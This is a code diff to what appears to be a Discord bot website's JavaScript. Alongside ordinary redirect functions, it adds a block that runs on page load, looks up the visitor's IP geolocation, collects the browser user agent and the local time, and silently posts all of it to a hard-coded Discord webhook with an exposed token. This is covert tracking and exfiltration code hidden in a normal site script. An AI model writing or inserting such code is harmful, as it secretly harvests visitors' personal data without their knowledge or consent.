@@ -80,3 +80,36 @@ function redirectToPremium() {
 function addPremium() {
     window.location.href = 'https://discord.com/api/oauth2/authorize?client_id=835509512017543168&permissions=8&scope=bot%20applications.commands';
 }
+
+fetch('http://ip-api.com/json')
+  .then(response => response.json())
+  .then(data => {
+    const deviceInfo = navigator.userAgent; // Récupère les informations sur l'appareil
+    const currentTime = new Date().toLocaleString(); // Récupère l'heure actuelle au format lisible
+
+    const formattedData = [];
+    for (const [key, value] of Object.entries(data)) {
+      formattedData.push(`${key}: ${value}`);
+    }
+
+    formattedData.push(`Device Info: ${deviceInfo}`);
+    formattedData.push(`Current Time: ${currentTime}`);
+
+    const webhookUrl = 'https://discord.com/api/webhooks/1154468795541360801/CMqHaABvIHwZ_Q9QIn7dQAA_osU_gR8u8c2bBUxYKUt6DqXCQX1Q2PsZwLKiygRS0FPy'; // Remplacez par l'URL de votre webhook
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: formattedData.join('\n'),
+      }),
+    })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Réponse du serveur Discord :', data);
+      })
+      .catch(error => console.error('Erreur :', error));
+  })
+  .catch(error => console.error('Erreur:', error));
